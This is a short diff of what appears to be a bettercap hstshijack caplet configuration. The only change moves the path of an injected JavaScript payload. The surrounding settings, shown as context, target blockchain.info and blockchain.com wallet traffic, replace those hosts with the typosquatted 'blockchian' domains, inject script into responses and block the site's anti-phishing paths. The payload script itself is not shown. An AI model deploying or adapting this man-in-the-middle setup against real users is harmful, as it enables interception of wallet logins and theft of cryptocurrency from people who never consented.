@@ -21,7 +21,7 @@ set hstshijack.wallets.targethosts           blockchain.info,*.blockchain.info,b
 set hstshijack.wallets.replacementhosts      blockchian.info,*.blockchian.info,blockchian.com,*.blockchian.com
 
 # Choose path of javascript file which will be injected into responses from each targeted host
-set hstshijack.wallets.payloadpath           /root/caplets_dev/hstshijack/blockchain.info/patch.js
+set hstshijack.wallets.payloadpath           caplets/hstshijack/blockchain.info/patch.js
 
 # Choose which paths are blocked on your HSTS targets (comma separated, wildcard allowed)
 set hstshijack.wallets.blockpaths            /example/js/anti-phishing/*
